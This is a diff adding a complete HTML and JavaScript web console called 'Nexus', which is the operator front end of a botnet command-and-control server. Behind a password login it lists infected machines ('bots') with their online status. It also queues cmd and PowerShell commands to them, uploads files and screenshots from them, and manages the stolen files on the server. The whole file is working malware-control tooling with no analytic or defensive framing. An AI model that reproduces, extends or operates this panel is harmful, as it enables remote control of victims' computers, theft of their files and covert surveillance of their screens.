@@ -1,0 +1,576 @@
+<!doctype html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+        <title>Nexus</title>
+        <link rel="icon" href="favicon.ico"/>
+        <link rel="stylesheet" type="text/css" href="cssreset-min.css"/>
+        <style type="text/css">
+            html {
+				background: url("nexus.jpg");
+				background-repeat: no-repeat;
+				background-attachment: fixed;
+				background-position: center;
+				background-size: cover;
+                background-color: #111;
+                }
+            body {
+                font-family: "Courier";
+                font-size: 13px;
+                color: #fff;
+				padding: 8px;
+				margin-bottom: 16px;
+				height: auto;
+                }
+			#display
+				{
+				float: right;
+				text-align: left;
+				position: fixed;
+				right: 8px;
+				top: 8px;
+				}
+            #in {
+				font-family: "Courier";
+                display: block;
+                position: fixed;
+				outline: none;
+                left: 0;
+                bottom: 0;
+                width: 100%;
+                padding: 8px;
+                border-color: #AAA;
+                border-width: 1px 0 0 0;
+                background-color: #000;
+                color: #fff;
+                }
+        </style>
+    </head>
+    <body>
+		<div id="display"></div>
+        <div id="out"></div>
+        <input id="in" tabindex="0"/>
+    </body>
+    <script type="text/javascript" src="yui-min.js"></script>
+    <script type="text/javascript">
+        YUI().use("node", function(Y) {
+			
+			var logged = false;
+			var commands = ["help", "login", "clear", "botnet", "botcmd", "botpshell", "botcheck",
+							"botoutput", "botgetfile", "botgetscreen", "fileslist", "removefile",
+							"downloadfile", "Help", "Login", "Clear", "Botnet",
+                            "Botcmd", "Botpshell", "Botcheck", "Botoutput", "Botgetfile",
+							"Botgetscreen", "Fileslist", "Removefile", "Downloadfile"];
+			var commandshistory = [""];
+			var commandhistorysize = 30;
+			var autocompletion = [];
+			var commandsindex = 0;
+			
+			//Add text to autocompletion	
+			function addToAutoCompletion(text) {
+				var acexists = false;
+				for (i in autocompletion) {
+					if (text == autocompletion[i]) {
+						acexists = true;
+						break;
+					}
+				}
+				if (!acexists && text != "")  autocompletion.push(text);
+			}
+
+
+			//List of all the commands and how to handle each command
+            var COMMANDS = [
+				
+				//Login
+				{
+					name: "login",
+					verbose: false,
+					handler: function(args) {
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							if (this.responseText == "True")
+							{
+								ConsolePrint("You have been successfully logged in, welcome!");
+								logged = true;
+								updateBotlist();
+							}
+							else
+							{
+								ConsolePrint("Wrong password!");
+								if (logged) ConsolePrint("Logged out!");
+								logged = false;
+							}
+						};
+
+						req.open("get", "login.php?psw=" + args[0], true);
+						req.send();	
+						
+					}
+				},
+
+				//Show all the commands available
+				{
+                    name: "help",
+                    verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+                        ConsolePrint("All the commands available:");
+                        ConsolePrintRow(["help", "", "show all the available commands"]);
+                        ConsolePrintRow(["login", "$password","login/logout"]);
+                        ConsolePrintRow(["clear", "", "clear console"]);
+                        ConsolePrintRow(["botnet", "", "show all the bot and their status"]);
+                        ConsolePrintRow(["botcmd", "$botname $command","send dos command to bot"]);
+                        ConsolePrintRow(["botpshell", "$botname $command","send powershell command to bot"]);
+                        ConsolePrintRow(["botcheck", "$botname","check if there is a command in queue"]);
+                        ConsolePrintRow(["botoutput", "$botname","show last stored output data about the bot"]);
+                        ConsolePrintRow(["botgetfile", "$botname $filepath","upload file from bot to the server"]);
+                        ConsolePrintRow(["botgetscreen", "$botname","take a screenshot"]);
+                        ConsolePrintRow(["fileslist", "" , "show all the files stored in the server"]);
+                        ConsolePrintRow(["removefile", "$filename","remove a file from the server"]);
+                        ConsolePrintRow(["downloadfile", "$filename","download a file from the server"]);
+					}
+                },
+
+				//Clear console
+				{
+                    name: "clear",
+                    verbose: false,
+					handler: function(args) {
+						Y.one("#out").get('childNodes').remove();	
+					}
+                },
+				
+				//Show all the bots in the net and the last status
+                {
+                    name: "botnet",
+					verbose: true,
+                    handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						//First request
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							if (this.responseText == "") {
+								ConsolePrint("No bot found");
+								return;
+							}
+							
+							var userdata = this.responseText.split("\n");
+
+							var time = (new Date).getTime()/1000;
+							for (key in userdata) {
+								if (userdata[key] != "") {
+									var datablocks = userdata[key].split(",");
+									addToAutoCompletion(datablocks[0]);
+									var hours = Math.floor((time - parseInt(datablocks[1])) / 3600);
+									var minutes = Math.floor(((time - parseInt(datablocks[1])) / 60) % 60);
+									if (hours == 0 && minutes == 0) ConsolePrintRow([datablocks[0],"ONLINE", datablocks[2]]); 
+                                    else ConsolePrintRow([datablocks[0], hours.toString() + "h " + minutes.toString() + "m ago", datablocks[2]]);
+								}
+							}
+						};
+						req.open("get", "blist.php?type=bots");
+						req.send();	
+					}
+                },
+				
+				{
+					name: "botoutput",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							if (this.responseText != "") ConsolePrint(this.responseText, "server");
+							else ConsolePrint("No bot output found");
+						};
+
+						req.open("get", "breturn.php?name=" + args[0] + "&func=get", true);
+						req.send();	
+					}
+				},
+				
+				//Send command to a bot
+				{
+					name: "botcmd",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							ConsolePrint(this.responseText, "server");
+						};
+					
+						var data = args[1];
+						var i = 0;
+						for (key in args) {
+							i++;
+							if (i < 3) { continue; }
+							data += "%20" + args[key];
+						}
+                        
+                        //0 say this is a cmd command
+						if (data != "" && data != "undefined") data = "0" + data;
+						
+						req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+						req.send();	
+					}
+				},
+				
+				//Send command to a bot
+				{
+					name: "botpshell",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							ConsolePrint(this.responseText, "server");
+						};
+
+						var data = args[1];
+						var i = 0;
+						for (key in args) {
+							i++;
+							if (i < 3) { continue; }
+							data += "%20" + args[key];
+						}
+                        
+                        //3 say this is a powershell command
+						data = "3" + data;
+						
+						req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+						req.send();	
+					}
+				},
+				
+				//Check if there is command in queue
+				{
+					name: "botcheck",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							if (this.responseText != "") ConsolePrint(this.responseText, "server");
+							else ConsolePrint("No command in queue")
+						};
+
+						req.open("get", "bcommand.php?name=" + args[0] + "&func=check", true);
+						req.send();	
+					}
+				},
+				
+				{
+					name: "botgetfile",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							ConsolePrint(this.responseText, "server");
+						};
+
+						var data = args[1];
+						var i = 0;
+						for (key in args) {
+							i++;
+							if (i < 3) { continue; }
+							data += "%20" + args[key];
+						}
+
+						//1 say this is a getfile command
+						data = "1" + data;
+						
+						req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+						req.send();	
+					}
+				},
+				
+             	{
+					name: "botgetscreen",
+					verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							ConsolePrint(this.responseText, "server");
+						};
+						req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=2", true);
+						req.send();	
+					}
+				},
+
+				{
+                    name: "fileslist",
+                    verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}	
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							
+							//Add to autocompletion
+							var blocks = this.responseText.split("\n");
+							for (i in blocks) addToAutoCompletion(blocks[i]);
+
+							//Print to console
+							if (this.responseText != "") ConsolePrint(this.responseText, "server");
+							else ConsolePrint("No file found");
+						};
+
+						req.open("get", "files.php?func=list", true);
+						req.send();	
+					}
+                },
+				
+				{
+                    name: "removefile",
+                    verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}	
+						
+						var req = new XMLHttpRequest();
+						req.onload = function() {
+							ConsolePrint(this.responseText, "server");
+						};
+
+						req.open("get", "files.php?func=remove&fname=" + args.join(" "), true);
+						req.send();	
+					}
+                },
+				
+				{
+                    name: "downloadfile",
+                    verbose: true,
+					handler: function(args) {
+						if (!logged) {
+							ConsolePrint("You need to login first with: login $password");
+							return;
+						}	
+                        
+						window.open("files/" + args.join(" "), "download");
+					}
+                },
+				
+            ];
+			
+			function updateBotlist() {
+				if (!logged) return;
+			
+				//First request
+				var req = new XMLHttpRequest();
+				req.onload = function() {
+					if (this.responseText == "") return;
+					
+					var data = "";
+					document.getElementById("display").innerHTML = "<p style='text-align:center; padding-bottom: 8px;'>DISPLAY</p>";
+
+					var userdata = this.responseText.split("\n");
+
+					var time = (new Date).getTime()/1000;
+					for (key in userdata) {
+						if (userdata[key] != "") {
+							var datablocks = userdata[key].split(",");
+							addToAutoCompletion(datablocks[0]);
+							var hours = Math.floor((time - parseInt(datablocks[1])) / 3600);
+							var minutes = Math.floor(((time - parseInt(datablocks[1])) / 60) % 60);
+							var pasttime = hours.toString() + "h " + minutes.toString() +  "m ago";
+							if (hours == 0 && minutes == 0) 
+							{
+								data += "<tr style='color:#f00;'><td>" + datablocks[0] + "</td><td style='padding-left:32px;'>ONLINE</td></td><td style='padding-left:32px;'>" + datablocks[2] +"</td></tr>";
+							}
+							else 
+							{
+								data += "<tr><td>" + datablocks[0]  + "</td><td style='padding-left:32px;'>" + pasttime + "</td></td><td style='padding-left:32px;'>" + datablocks[2] + "</td></tr>";
+							}
+						}
+					}
+					var p = Y.Node.create(data);
+	                Y.one("#display").append(p);
+	                p.scrollIntoView();
+				};
+				req.open("get", "blist.php?type=bots");
+				req.send();
+			}
+			
+			//Process each inserted command
+			function processCommand() {
+                var inField = Y.one("#in");
+                var input = inField.get("value");
+                var parts = input.replace(/\s+/g, " ").split(" ");
+                var command = parts[0].toLowerCase();
+                var args = parts.length > 1 ? parts.slice(1, parts.length) : [];
+                
+                //Check for empty command
+                if (command == "") return;
+				
+				//Update commands history
+				if (commandshistory[1] != input) {
+					for (i = commandhistorysize; i > 1; i--) commandshistory[i] = commandshistory[i-1];
+					commandshistory[1] = input;
+				}
+
+				//Reset field text
+                inField.set("value", "");
+				
+				//Execute command
+                for (var i = 0; i < COMMANDS.length; i++) {
+                    if (command === COMMANDS[i].name) {
+						if (COMMANDS[i].verbose) ConsolePrint("> " +  parts.join(" "), "user");
+                        COMMANDS[i].handler(args);
+                        return;
+                    }
+                }
+				
+				//Unknown command error message
+				ConsolePrint("> " +  parts.join(" "), "user");
+                ConsolePrint("Error: unknown command '" + command + "'");
+            }
+			
+			//Output a text to the console
+            function ConsolePrint(text, style) {
+				var data;
+				if (style == "server") data = "<pre style='color:#fff;'>" + text + "</pre>";
+				else if (style == "user") data = "<p style='color:#f00;'>" + text + "</p>";
+                else if (style == "code") data = text;
+				else data = "<pre>" + text + "</pre>";
+                var p = Y.Node.create(data);
+                Y.one("#out").append(p);
+                p.scrollIntoView();
+				window.scrollTo(0,document.body.scrollHeight);
+            }
+            
+            //Output a text to the console
+            function ConsolePrintRow(cells) {
+				var data;
+				data = "<tr>";
+                for (i in cells) {
+                	if (i == 0) data+="<td>" + cells[i] + "</td>";
+                    else data+="<td style='padding-left:32px;'>" + cells[i] + "</td>";
+                }
+                data += "</tr>";
+                var p = Y.Node.create(data);
+                Y.one("#out").append(p);
+                p.scrollIntoView();
+				window.scrollTo(0,document.body.scrollHeight);
+            }
+			
+			//Main
+            Y.on("domready", function(e) {
+
+				//Welcome message
+				ConsolePrint("Welcome in the Nexus!");
+				ConsolePrint("Please login with: login $password");
+				
+				//Update bot list
+				window.setInterval(function() {
+					updateBotlist();
+				}, 8000);
+
+				//Add commands to autocompletion
+				for (i in commands) addToAutoCompletion(commands[i]);
+
+				Y.one("body").setStyle("paddingBottom", Y.one("#in").get("offsetHeight"));
+                Y.one("#in").on("keydown", function(e) {
+					//Up
+					if (e.charCode === 38) {
+						commandsindex++;
+						if (commandsindex > commandhistorysize) commandsindex = 6;
+						Y.one("#in").set("value", commandshistory[commandsindex]);
+					}
+					
+					//Down
+					if (e.charCode === 40) {
+						commandsindex--;
+						if (commandsindex < 0) commandsindex = 0;
+						Y.one("#in").set("value", commandshistory[commandsindex]);
+					}
+					
+					//Enter
+                    if (e.charCode === 13) {
+						commandsindex = 0; 
+						processCommand();
+                    }
+                    
+					//Tab
+					if (e.charCode === 9 || e.charCode === 188) {
+
+						//Focus textbox
+						e.preventDefault();
+				
+						var word = Y.one("#in").get("value").replace(/\s+/g, " ").split(" ").slice(-1)[0];
+						var completion = "";
+						var firstcompletion = false;
+						for (i in autocompletion) {
+							var start;
+							for (c in word) {
+								start = c;
+								if (word[c] != autocompletion[i][c]) {
+									start = 0;	
+									break;
+								}
+							}
+							if (start != 0) {
+								if (!firstcompletion) {
+									completion = autocompletion[i].slice(start).substr(1);
+									firstcompletion = true;
+								}
+								else
+								{
+									var actest = autocompletion[i].slice(start).substr(1);
+									for (i in completion) {
+										if (completion[i] != actest[i]) {
+											completion = completion.substr(0, i);
+											break;
+										}
+									}
+								}
+							}
+						}
+						Y.one("#in").set("value", Y.one("#in").get("value") + completion);
+					}
+
+                });
+            });
+
+        });
+    </script>
+</html>
